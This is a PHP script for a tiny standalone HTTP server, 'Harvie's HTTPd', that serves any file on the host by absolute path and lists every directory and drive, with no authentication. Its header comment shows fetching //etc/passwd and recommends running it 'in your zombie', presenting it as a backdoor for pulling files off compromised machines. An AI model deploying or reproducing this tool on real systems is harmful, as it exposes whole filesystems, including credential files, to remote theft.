#!/usr/bin/php
<?php
//Harvie's HTTPd 0.7
/*
  Allows you to binary safe download any file from remote pc
    http://server:port/file
    http://server:port//etc/passwd
    http://server:port/C:\dir\file
    http://server:port/C:/dir/file
  Since version 0.6 there is filelisting
    http://server:port/dir
    http://server:port//etc
    http://server:port/C:/dir
    http://server:port/C:/dir/
  You can also play multimedia like streams (using XMMS, Winamp, etc...)
  But this can serve only one file a time
    (if you are streaming or downloading, you can download/browse anything other,
    but you can use download manager to download file by file...)
  You can change port or interface by passing arguments
  Usage: (httpd.php [port] [interface_IP])
  This is very nice utility to use in your zombie.
*/

//////////////////////////////////////////////////////////////////////////////////
$interface = "127.0.0.1";
//$interface = "192.168.2.130";
$port = 8080;

//////////////////////////////////////////////////////////////////////////////////
$okheader = //Header 200 FILE
  "HTTP/1.0 200 OK\n".
  "Server: Harvie's HTTPd\n".
  "Connection: close\n\n";

$dirheader = //Header 301 DIR
  "HTTP/1.0 301 Moved Permanently\n".
  "Server: Harvie's HTTPd\n".
  "Location: %DIR%\n".
  "Connection: close\n\n";

$badheader = //Header 404
  "HTTP/1.0 404 File not found!\n".
  "Server: Harvie's HTTPd\n".
  "Connection: close\n\n";

$err404 = "ERR 404 - NOT FOUND!"; //Error 404

//////////////////////////////////////////////////////////////////////////////////
if(isset($argc)) {
  if($argc > 1) $port = trim($argv[1]);
  if($argc > 2) $interface = trim($argv[2]);
}

///FUNCTIONS//////////////////////////////////////////////////////////////////////
function send_dir_listing($fp, $directory) {
	$num = "0"; 
  //Header
  @fwrite($fp, "<html>\n<head><title>Index of $directory</title></head>\n<body><tt>\n");
  @fwrite($fp, "<b>Available volumes:</b><br />\n");
  
  //Special folders
  @fwrite($fp, "[<a href=\"/\">/</a>]\n"); //Server root
  if(is_dir("/")) { //Unix root
    @fwrite($fp, "[<a href=\"//\">//</a>]\n");
  }
  
  //Available volumes
  $dsks = "cdefghijklmnopqrstuvwxyz"; //Show this volumes (if available)
  for($i=0;$i<strlen($dsks);$i++) {
    if(is_dir($dsks[$i].":")) {
      $vol = $dsks[$i];
      @fwrite($fp, "[<a href=\"/$vol:/\">$vol:</a>]\n");
    }
    //echo($dsks[$i].":");
  }
  @fwrite($fp, "<br />\n\n");
  
  //Directory listing
  @fwrite($fp, "<b>Directory listing of $directory :</b><br /><br />\n\n");
  @fwrite($fp, "[DIR] <a href=\"./../\">Parent Directory (../)</a><br />\n");
	$files=opendir ($directory); 
		while (false!==($file = readdir($files))) 
		{ 
				if ($file != "." && $file != "..") 
				{ 
            $num++;
            if(is_dir("$directory/$file")) {
              fwrite($fp, "$num - [DIR] <a href=\"./$file\">$file</a><br />\n");
            } else {
              fwrite($fp, "$num - <a href=\"./$file\">$file</a><br />\n");
            }
				} 
		}
    
    //Footer
		fwrite($fp, "<br />\n<b>Total: $num</b>\n</tt></body>\n</html>");
}

///CODE///////////////////////////////////////////////////////////////////////////
echo("\n\tStarting Harvie's HTTPd at:\n\ttcp://$interface:$port\n\n");
//system("title Harvie's HTTPd at tcp://$interface:$port"); //Microsoft Windows only
set_time_limit(0);
$sss = stream_socket_server("tcp://$interface:$port");

while(1) {
  @$sfp = stream_socket_accept($sss);
  if(!$sfp) continue;

  $loop = 1;
  while($sfp && !@feof($sfp) && $loop) {
    $line = fgets($sfp);
    //echo($line);
    if(eregi("(GET|POST)", $line)) {
      $line = trim($line);
      //echo($line);
      $line = explode(" ", $line);
      
      $line[1] = trim(urldecode($line[1]));
      
      
      if($line[1] == "/") {
        $line[1] = "./";
      } else {
        $line[1] = substr($line[1], 1);
      }
      
      
      if(is_file($line[1])) { //200 OK FILE
        fwrite($sfp, $okheader);
        echo("200 ".$line[1]);
        $fp = fopen($line[1], "rb");
        while( fwrite($sfp, fgets($fp)) );
        @fclose($sfp);
        echo(" SENT!\n");
      }
      
      elseif(is_dir($line[1])) { //200 OK DIR
        if(substr($line[1], strlen($line[1])-1) != "/") { //301 MOV DIR
          $header = ("/".$line[1]."/");
          echo("301 ".$line[1]." -> $header\n");
          $header = str_replace("%DIR%", $header, $dirheader);
          //$header = str_replace("./", "./", $dirheader);
          //echo($header);
          fwrite($sfp, $header);
          @fclose($sfp);
          break;
        }
        echo("200 [DIR] ".$line[1]."\n");
        send_dir_listing($sfp, $line[1]);
      }
      
      else { //404 NOT FOUND
        echo("404 ".$line[1]."\n");
        fwrite($sfp, $badheader);
        fwrite($sfp, $err404);
        @fclose($sfp);
      }
      
      $loop = 0;
    }
  }
  @fclose($sfp);
}

?>
